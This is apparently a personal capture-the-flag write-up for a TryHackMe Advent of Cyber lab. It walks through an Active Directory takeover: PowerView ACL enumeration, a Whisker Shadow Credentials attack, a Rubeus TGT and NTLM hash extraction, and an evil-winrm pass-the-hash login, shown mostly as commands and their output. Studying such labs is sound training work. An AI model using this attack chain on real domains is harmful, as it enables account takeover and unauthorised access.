--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
										---------------------------/* RDP */----------------------------
[*] : Enumerating the Active Directory 

PS C:\Users\hr\Desktop> powershell -ep bypass 
##  will bypass the default policy for arbitrary PowerShell script execution

PS C:\Users\hr\Desktop> . .\PowerView.ps1 
## loads the PowerView script into the memory.

PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids 
## will return all users' privileges.

PS C:\Users\hr\Desktop> Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" }
## Since we are specifically looking for the current user "hr", we need to filter out 

ObjectDN                : CN=vansprinkles,CN=Users,DC=AOC,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1966530601-3185510712-10604624-1115
IdentityReferenceName   : hr
IdentityReferenceDomain : AOC.local
IdentityReferenceDN     : CN=hr,CN=Users,DC=AOC,DC=local
IdentityReferenceClass  : user  

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                

## We can run the add command from Whisker to simulate the enrollment of a malicious device, updating the msDS-KeyCredentialLink attribute. 

## msDS-KeyCredentialLink : is an attribute used by the Domain Controller to store the public key in WHfB for enrolling a new user device (such as a computer). In short, each user object in the Active Directory database will have its public key stored in this unique attribute. 



PS C:\Users\hr\Desktop> .\Whisker.exe -h
Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their
msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the target account.
Usage: ./Whisker.exe [list|add|remove|clear] /target:<samAccountName> [/deviceID:<GUID>] [/domain:<FQDN>]
[/dc:<IP/HOSTNAME>] [/password:<PASWORD>] [/path:<PATH>]

PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password hJ2MLEwwgQ8Feegh
[*] Searching for the target account
[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 55b4415a-6b84-4d11-bc2d-463a1662daae
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:
Rubeus.exe asktgt /user:vansprinkles 
certificate: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 /password:"hJ2MLEwwgQ8Feegh" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show 

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Rubeus, a C# toolset designed for direct Kerberos interaction and exploitation, was developed by SpecterOps. a pass-the-hash attack
# You can continue the exploitation by asking for a TGT of the vulnerable user using the certificate generated in the previous command.
# Once you've obtained the certificate, you can acquire a valid TGT and impersonate the vulnerable user. Additionally, the NTLM hash of the user account can be displayed in the console output, 
# which can be used for a pass-the-hash attack!
# You can continue the exploitation by asking for a TGT of the vulnerable user using the certificate generated in the previous command.
# To do so, copy and paste the output from the previous command. A detailed explanation of what that command is doing can be seen below:
/*-----------------------------------------------------------------------------------------------*\
|[+]You can now run Rubeus with the following syntax: 						  |
|												  |
|[*]asktgt this will make a request to obtain the TGT 						  |
|												  |
|[*]/user the user we want to impersonate for the TGT 						  | 
|						      						  |
|[*]/certificate the certificate generated to impersonate the target user 			  |
|												  |
|[*]/password the password used for decoding the certificate since it's encrypted		  |
|												  |
|[*]/domain the target Domain									  |
|												  |
|[*]/getcredentials this flag will retrieve the NTLM hash, which will be used in the next step    |
|												  |
|[*]/dc the Domain Controller that will generate the TGT					  |
\*-----------------------------------------------------------------------------------------------*/	

PS C:\Users\hr\Desktop> .\Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"hJ2MLEwwgQ8Feegh" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
[*] Using domain controller: fe80::69f5:ff9a:a44b:ec8a%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      T0MubG9jYWw=

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  vansprinkles
  UserRealm                :  AOC.LOCAL
  StartTime                :  12/17/2023 9:28:30 PM
  EndTime                  :  12/18/2023 7:28:30 AM
  RenewTill                :  12/24/2023 9:28:30 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  TaqgFo3cIVlTk5YeDFH9cA==
  ASREP (key)              :  07A2DB271753FE87AAB56B4486DA127D

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 03E805D8A8C5AA435FB48832DAD620E3 /

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
												
										---------------------------/* ATTACK-BOX */----------------------------
												
#You can now execute a pass-the-hash attack using the NTLM hash obtained from the previous command. 
#This attack involves leveraging the encrypted password stored in the Domain Controller rather than relying on the plaintext password.
#Check Attack_box.[1]Evil-WinRM, a tool for remotely managing Windows systems abusing the Windows Remote Management (WinRM) protocol.

	┌──(kali㉿kali)-[~/…/HackingLab/TryHackMe/Adventofcyber/day11]
	└─$ evil-winrm -i 10.10.176.93 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3 
                                        
	Evil-WinRM shell v3.5
                                        
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is
	unimplemented on this machine
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\vansprinkles\
	


[1] : 03E805D8A8C5AA435FB48832DAD620E3 
## hash of the vulnerable user is in visible using rubeus , check NTLM

[2] : *Evil-WinRM* PS C:\Users\Administrator\desktop> cat flag.txt
THM{XMAS_IS_SAFE}
## root flag
